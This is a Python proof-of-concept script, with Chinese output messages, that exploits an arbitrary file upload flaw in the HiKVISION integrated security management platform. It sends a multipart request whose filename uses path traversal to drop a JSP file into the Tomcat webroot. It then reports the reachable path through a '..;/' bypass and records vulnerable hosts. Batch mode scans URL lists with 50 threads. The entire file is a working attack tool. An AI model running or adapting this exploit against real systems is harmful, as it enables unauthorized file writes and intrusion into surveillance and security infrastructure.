import argparse,requests,sys,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """HiKVISION综合安防管理平台report任意文件上传漏洞POC"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='HiKVISION综合安防管理平台report任意文件上传漏洞POC')
    parser.add_argument('-u','--url',dest='url',type=str,help="input your link")
    parser.add_argument('-f','--file',dest='file',type=str,help="input your file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/svm/api/external/report"
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/41.0.2227.0Safari/537.36',
        'Content-Type':'multipart/form-data;boundary=----WebKitFormBoundarykcerblvm'
    }
    data = '------WebKitFormBoundarykcerblvm\r\nContent-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/mctc.jsp"\r\nContent-Type: application/zip\r\n\r\n123\r\n\r\n------WebKitFormBoundarykcerblvm--'
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=10)
        path = "/portal/ui/login/..;/..;/mctc.jsp"
        content = json.loads(res1.text)
        if res1.status_code == 200 and content['code'] == '0x26e31402':
            print(f"[+]{target} 存在文件上传漏洞\n文件上传的路径为:{target}{path}")
            with open('HIKVIS_result.txt','a') as fp:
                fp.write(f"{target}存在文件上传漏洞\n")
        else:
            print(f"[-]{target}不存在文件上传漏洞")
    except:
        print(f"{target}该网站可能存在文件上传请手工注入")
if __name__ == '__main__':
    main()